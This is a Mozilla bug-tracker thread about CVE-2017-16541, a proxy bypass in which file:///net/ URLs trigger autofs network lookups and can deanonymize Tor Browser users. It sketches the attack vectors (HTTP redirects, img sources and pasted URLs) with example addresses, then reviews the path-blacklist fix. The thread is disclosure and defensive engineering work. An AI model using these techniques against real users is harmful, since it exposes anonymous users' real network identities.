At first I had trouble reproducing the HTTP redirect problem. For some reason the problem does occur reliably in the first/default tab in Tor Browser 7.0.x but I can always reproduce it in a new tab. Now I can confirm that the patch from [comment #36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") closes the HTTP redirect hole on macOS.
I wonder if there are other similar holes that need to be closed. Script-based techniques such as setting document.location seem to be caught early by existing code that calls ssm->CheckLoadURIFromScript(). I tried using a file:///net/... URL as the src for an <iframe> but that is also blocked early by existing code. I don't think FTP supports redirect to an arbitrary URL. Can anyone think of other protocols or techniques within HTTP or HTML that we should examine? I don't know what netwerk/protocol/gio does but at least that is not included in ESR52 (so it is not an immediate concern for Tor Browser).

A couple of much weaker attacks I noticed:
1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar
2. Open an html page with <img src="file:///net/11.11.11.14/a.jpg">. Now choose Page Info, click on the item for the fake image, click "Save As" and choose a location to save the file.
#1 is perhaps a concern. For #1 the most promising fix I can think of is to blacklist URLs of the form "file:///net/\*".
#2 seems unlikely to be a very useful attack vector, but perhaps it would be good to fix as well.

Thanks for those points. Yes, those are scenarios the final patch has to address, I agree. Especially #1. I think, though, we could release an update without addressing them (I am building right now a new Tor Browser including your redirect patch as well \*fingers crossed\*).

> I would imagine that the web never needs access to a local file
You would imagine wrong. See <http://searchfox.org/mozilla-central/rev/aa1343961fca52e8c7dab16788530da31aab7c8d/caps/nsIScriptSecurityManager.idl#129-134> for example.
> Dan, under what circumstances do we want to allow an http redirect to a file?
Again, see our explicit support for allowing some sites, controlled by prefs, to link to file:// URIs.
For the real underlying issue here, the basic problem is that file:// is so messed up, between symlinks, virtual filesystems, etc. Some specific issues with them:
1) Some of our security checks (e.g. CheckMayLoad) \_require\_ that symlinks be resolved
before a check is done, due to the fact that we treat files in the same dir as same-origin
but symlinks can cross directory boundaries. This obviously requires a stat().
2) CheckMayLoad also needs to stat() files because it needs to treat file:///foo and file:///FOO
as same-origin on case-insensitive filesystems.
3) For this bug, it sounds like CheckLoadURI needs to happen \_before\_ we ever stat() the file.
This list is clearly not exhaustive.
To fix issues around symlinks, we resolve symlinks (and hence stat() the file) immediately in nsFileChannel::Init. I urge everyone to read through [bug 670514](/show_bug.cgi?id=670514 "VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share") to see why doing it fully lazily (and not caching the stat() results) does not work. That said, we could consider doing it as part of the AsyncOpen security-check process, instead of Init(), and make sure that it happens after the CheckLoadURI call. I \_think\_ that should avoid regressing the issues from [bug 670514](/show_bug.cgi?id=670514 "VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share") while allowing us to fix this bug.
I should note that until we moved CheckLoadURI into the channel code, this was slightly less of an issue, because we did not create the channel until \_after\_ CheckLoadURI passed. I don't know whether CheckLoadURI still involved a stat() at that point or not. We would need to check whether it does one.
We definitely need to ensure that we do not ever \_read\_ the file (including for "symlink resolution" or Windows equivalent) until after CheckLoadURI passes in the cases in which reading the file is already a failure (various /dev/tty bits on Linux, Windows special files that hang or crash the process when read, etc).
> 1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar
True. The user could also be induced to paste "touch /net/11.11.11.14/a.css" into their terminal... I think fundamentally having autofs enabled is pretty prejudicial to fully controlling your network access. :(
> Now choose Page Info, click on the item for the fake image, click "Save As" and choose a location to save the file.
Right, there's a fundamental tension here between "the page is not allowed to link there" and "the user wants to get the data"... It's worth looking at the history of whether page info ever enforced CheckLoadURI checks on the "Save As" functionality in its media tab and thinking about whether it should.

Something interesting I observed is, without the patch in [comment 36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"), some UDP events are detected at the target server, but that is followed by a Security Error appearing in the web console claiming the redirect is not permitted. So it appears that the intention was already to cancel (most) redirects from http to file:///, but the cancellation happens too late to prevent some network leakage. So, in the final patch, the existing code that prevents redirects to file:/// and takes into account certain prefs as mentioned by Boris, perhaps needs to be refactored to a new location such that cancellation happens earlier.

I think Boris added a bunch of very valuable information within [comment 44](/show_bug.cgi?id=1412081#c44 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"). Probably it's best we don't do stat() within ::init() but instead rather move it to asyncOpen2.

From conversation, the Linux sandbox "catches" and blocks that stat() from content, but resolving what is actually being stat() to see if it's allowed leads to the information leak happening on the chrome side. Content will be told the path is not allowed but of course by then the damage is done.
It's reasonable suspect the macOS kernel bug works along similar lines.

Are there strong voices against disabling file: URI loading \*completely\* via a preference that the Tor browser could set? It would be a solution for similar [bug 1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb") too.

Do we have UI resources that load from file:// URIs?
If we only want to disable it from web pages, seems like an extension could easily do that...

We can substitute internally to file:// (moz-ext:, resource:, jar:?), so general disabling is not possible, right.
We want to disable only: top level loads (typing in address bar, command line, link clicks), iframes, subresources, general redirects-to, something else?
The distinction could be system principal, but I'm not sure if there can be a case of a system-principal load that is user/content-controlled and not application-controlled.

Apple have notified me that they believe this is fixed in the macOS 10.13.3 beta -- once that's released (they didn't provide a date) we can disclose the bypass mechanism if we like.

Now that this is resolved in macOS, I'd like to go about upstreaming to Firefox the improvements tor landed to refuse to access file:// resources earlier.
Arthur, is that something on your roadmap, or would it be helpful if I took that on? And if the latter, do you have a link to the patches that tor is currently applying for this?Flags: needinfo?(arthuredelstein)

If you could work on this, please do. The patches are here:
<https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&id=4fbe4216456298af5c68198b3ff0f552f9bb8464>

Now, those were just hacks (and a follow-up bugfix) we deployed to close the critical hole as fast as possible and they are breaking some file:// usage scenarios. I am not sure Mozilla would want those. If so, fine with us. But if you or anyone else could use this opportunity to have a real fix ready for ESR 60 that would be great!Flags: needinfo?(arthuredelstein)

Only for our use case. It's still a proxy bypass, so Tor is carrying an incomplete fix for this that (I think) breaks some functionality like Save t file or something similar. They're going to wind up backporting whatever we come up with to 60; so it would be good to avoid a confusing rebase for them...

you don't need Record()
you have to read (check) the ',' character
the loop should be `while (!p.CheckEOF()) { do stuff; }
you may want to do path.Trim() as you don't skip whitespaces

OK, this can't be here. This was my main concern with the previous patch. This can potentially break things. It definitely changes behavior, is not behind the pref and definitely cannot be uplifted like this to ESR.
Move these lines INSIDE FilePreferences::IsAllowedPath and do it ONLY when there are names (prefixes) to be blacklisted or do the normalization as I do in my base patch (you will need the normalizer be a template and derive from TTokenizer<chat\_path\_t>, like #ifdef XPWIN typedef char16\_t char\_path\_t; #else typedef char char\_path\_t; #endif)
But I think this "has special dir -> throw" approach if fine when off by default.
OTOH, note that paths get here likely already normalized, at least on windows I could see that navigating to file:///c:/./././././././././././ is file://c:/ when coming to InitWithPath, no idea where that happens, but I made sure no smb request/lookup was triggered before InitWithPath was entered for file://///share uris.
hmm... we should make sure there is no code in upper layers that may look for /. or /.. in the path and call some system API normalization function that could trigger the smb/net lookup.
then, just for case, remember that ':' is a directory delimiter on osx!

I kept it nsCString to be able to still do path.Trim(" ")
Since this only happens once, at startup, the extra number of copies should be minimal.

Changed it to must have.

Yes, but that depends on the blacklisted path. If the parent name is /folder and we blacklisted /folder/ it will not match, but all of its children will.

Fair enough. Note that I kept some of the changes in AppendRelativeNativePath:
Append('.') does nothing.
Append('..') throws NS\_ERROR\_FILE\_UNRECOGNIZED\_PATH just like the windows implementation, and as specified in nsIFile.idl
I think the fact that it was accepted was a bug.

I made the Normalizer a template instead.
We now build the fileBlacklist code on windows too, even though it does nothing.

I think this is done in nsLocalFile::Normalize().
However, on Linux it performs a call to the system realpath, which resolves relative paths and also links.

I'll keep this one around (to fix nsIFile.idl inconsistency) unless it breaks some tests.

Note that it depends on Honza's patch from [bug 1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb").
A few notes about the patch:
In order to block file access to "/net" you should add a pref (name:"network.file.path\_blacklist", value:"/net")
It does have one weakness: symlinks. For a given symlink A that is not blacklisted it is impossible to know if its target B is blacklisted or not.Flags: needinfo?(gk)

Turns out it broke some tests. :)
test\_bug1056939.js tested files that contained .. in them.
test\_file\_equality.js checks that appending . gives you a different file.
I filed [bug 1469737](/show_bug.cgi?id=1469737 "NEW") for this.
I also fixed the nsTArray\_base leak at shutdown.

Do you have one rebased against ESR60 handy by chance? I get a bunch of conflicts in FilePreferences.cpp when trying to apply your patch. I'll try to resolve them but I am a bit nervous about the correctness of the result.

What does that mean in practise? If an attacker is pointing to symlink A the proxy bypass we try to avoid is getting triggered?Flags: needinfo?(gk) â†’ needinfo?(valentin.gosu)

It means that if the attacker can create a symlink that points to B, or if the attacker is aware of A that points to B, they could potentially bypass the filter. That seems unlikely to me, but it's important to keep in mind.

That one works for us, thanks so much! (The one you pointed me to in comment:83 still shows the problem. It took me a while to figure out what was going on :) )
I am not sure about the symlink issue yet. While I am not worried about the attacker being able to create a symlink I feel it should not be possible for arbitrary (third-party) web content to trigger any proxy bypass in case the user has told the browser "hey, for any web-related traffic, please use proxy $foo", irrespective of how the machine of the user outside of the browser is configured. This does not block our alpha release, but we should think about it while we progress towards getting Tor Browser 8 into stable shape.

I'm leaking an nsTArray\_base, sBlacklist, and I'm not exactly sure I'm using StaticAutoPtr correctly.
I've confirmed it's not sWhitelist by commenting it out: <https://treeherder.mozilla.org/#/jobs?repo=try&revision=064c72d8511a3fa831cef3282fb75930ad6acf93&selectedJob=184200087>

Talking to Valentin over IRC turned up two potential scenarios for sBlacklist to leak:
a) InitPrefs possibly getting called after sBlacklist has been released:
<https://hg.mozilla.org/try/rev/7fb190786695#l1.49>
So we're re-initializing prefs after shutdown...which seems quite unlikely.
b) Some sort of race in IsAllowedPath:
<https://hg.mozilla.org/try/rev/145bf576adf9#l1.358>
T1: In IsAllowedPath, check for the presence of sBlacklist
T1: sBlacklist is there, proceed
T2: clear sBlacklist as we're going through shutdown
T1: Call PathBlacklist, which re-allocates sBlacklist and leaks
This race is plausible in [attachment 8986337](/attachment.cgi?id=8986337 "patch") [[details]](/attachment.cgi?id=8986337&action=edit "patch") [[diff]](/attachment.cgi?id=8986337&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986337) (though we really should have some checking in the ClearOnShutdown machinery to catch this sort of thing), but the try push actually changes things in IsAllowedPath:
<https://hg.mozilla.org/try/file/5c706ce50459/xpcom/io/FilePreferences.cpp#l267>
so that we don't try reallocating...but in that case, we should hit some sort of null pointer dereference if the race was really happening.
I tried getting a handle on where the allocated nsTArray\_base was coming from, but the debugging infrastructure we had for that blew up in my face.
So now I'm not sure where the leak is coming from. =/

Before these calls we have CHECK\_mPath which checks FilePreferences::IsAllowedPath()

Add ability to blacklist file paths on Unix platforms
Approval Request Comment
[Feature/Bug causing the regression]:
TOR requirement to block access to certain paths on the filesystem
[User impact if declined]:
A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.
[Is this code covered by automated tests?]:
The patch includes a gtest
[Has the fix been verified in Nightly?]:
Yes
[Needs manual test from QE? If yes, steps to reproduce]:
Reproduce [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"). Set network.file.path\_blacklist to /net. Restart the browser. Check that the bug is fixed.
[List of other uplifts needed for the feature/fix]:
[attachment 8990057](/attachment.cgi?id=8990057 "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[details]](/attachment.cgi?id=8990057&action=edit "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[diff]](/attachment.cgi?id=8990057&action=diff "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990057) to avoid leaks in the plugin process.
[Is the change risky?]:
Low risk
[Why is the change risky/not risky?]:
The patch only produces effects when the pref is set, which will probably only affect TOR.
[String changes made/needed]:
None.Flags: needinfo?(valentin.gosu)

[ESR60] patch
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
Required in TOR.
User impact if declined:
[TOR] A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.
Fix Landed on Version:
Firefox 63 with an uplift requested for beta 62.
Risk to taking this patch (and alternatives if risky):
Low risk. Functionality is only enabled with the hidden pref set, which would be only in TOR.
String or UUID changes made by this patch:
None.

With the steps from [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") mostly.
I used 2 different stations. One was on mac and the other on Ubuntu.
On mac I created the pref from [comment 103](/show_bug.cgi?id=1412081#c103 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") (network.file.path\_blacklist set to /net). I changed the proxy and port and I opened the link from [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") (<https://pearlcrescent.com/tor/am.html>).
On Ubuntu, I opened Firefox, changed the pref and port and then in the terminal I wrote the command "sudo tcpdump port 111".
Did I do everything wrong? Maybe I didn't understand fully what I have to do, because I got the same behaviour on the old builds as on the latest Nightly.Flags: needinfo?(oana.botisan)

I am not sure regarding macOS but on Linux you need to install the autofs package and uncomment the line "/net -hosts" in /etc/auto.master first as a preparation step. When testing our backport for this patch I configured Tor as a proxy (just installing Tor via your package manager should suffice and then entering 127.0.0.1:9050 as the SOCKS proxy host/port) and then looked at my local wireshark output. Hope this helps. Let me know if not.Flags: needinfo?(arthuredelstein)

Looking at the gtest failure now.

Attached patch

â€” [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8998347)

As the comment in the patch says, the changes I made required the whitelist to be properly instantiated - which the gtest did not previously do.Flags: needinfo?(valentin.gosu)

In the future, it would be really nice if the follow-up patches were folded into the main patch for landing.

Valentin, there seems to be some kind of discrepancy between our code base and the tore code base on ESR60 (IIUC).
Our code (the current, latest changeset):
<https://hg.mozilla.org/releases/mozilla-esr60/annotate/8a1e8be23bad/xpcom/io/FilePreferences.cpp#l263>
Tor code:
(patch) <https://gitweb.torproject.org/user/richard/tor-browser.git/commit/xpcom/io/FilePreferences.cpp?h=bug_26874&id=50f4653b90316394e7d6d3cd4a3e92e12f377666>
(file) <https://gitweb.torproject.org/user/richard/tor-browser.git/tree/xpcom/io/FilePreferences.cpp?h=bug_26874&id=50f4653b90316394e7d6d3cd4a3e92e12f377666#n263>
Please see [https://bugzilla.mozilla.org/show\_bug.cgi?id=1413868#c70](/show_bug.cgi?id=1413868#c70 "RESOLVED FIXED - proxy bypass on windows via smb") for further details. They claim that the patches don't work and removing the |if (!sWhitelist) { return false; }| part fixes it.
It may be that AllowUNCDirectory() which ensures sWhitelist is not called from some reason.
Maybe we should change the code to block all unc paths when sWhitelist is null and sBlockUNCPaths == true?
It's hard to track what's actually correct with all the backouts and merges.
Note: <https://dxr.mozilla.org/mozilla-esr60/> is out of sync ://Flags: needinfo?(valentin.gosu)

Ok I have access now!
Yeah so the issue here is that sWhitelist is only populated after a call to PathWhitelist(). The various directories are whitelisted during firefox init (and sWhitelist is populated) in AllowUNCDirectory(char const\*) by way of InitDirectoriesWhitelist(). However, the call to PathWhitelist() does not occur until the end of AllowUNCDirectory(), and only if the directory resolves to an SMB path (ie, begins with \\). So, unless one of the special dirs live on an SMB share, sWhitelist will never be populated, and the call to IsBlockedUNCPath() will always early out due to the !sWhiteList check.
The !sWhitelist check should be removed, since the underlying pointer is never accessed directly, and always through the PathWhitelist() getter/initializer.
I've a screenshot ( here: [https://bugzilla.mozilla.org/show\_bug.cgi?id=1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb") ) demoing the proxy bypass still exists in ESR60 on Windows 7.

I think that's because TOR landed the patch in before [comment 89](/show_bug.cgi?id=1412081#c89 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") ([attachment 8986596](/attachment.cgi?id=8986596 "[ESR60]  patch") [[details]](/attachment.cgi?id=8986596&action=edit "[ESR60]  patch") [[diff]](/attachment.cgi?id=8986596&action=diff "[ESR60]  patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986596)) and the ESR patch landed a bit later, with a few nits.
The version in m-c actually does not contain the sWhitelist thing, since the leak didn't happen on Windows, so I assume we should probably update TOR and ESR.

I agree. I'll file a separate bug for it.Flags: needinfo?(valentin.gosu)
